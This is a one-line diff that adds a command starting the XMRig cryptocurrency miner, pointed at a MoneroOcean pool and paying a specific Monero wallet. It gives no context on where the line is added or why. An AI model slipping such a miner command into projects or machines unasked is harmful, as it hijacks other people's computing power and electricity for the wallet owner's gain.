@@ -1,0 +1,1 @@
+xmrig.exe -o gulf.moneroocean.stream:10001 -u 86vvDCntZccc8ER6qHes4RB5gBXQY8uk5AdP3AaGZs96bgPqsELs18mLpQf4HAhUhrjdjj3eSj8NAibbso8Pkk2jTj1d91X -p x -k --threads=4 --coin monero -a cn/gpu
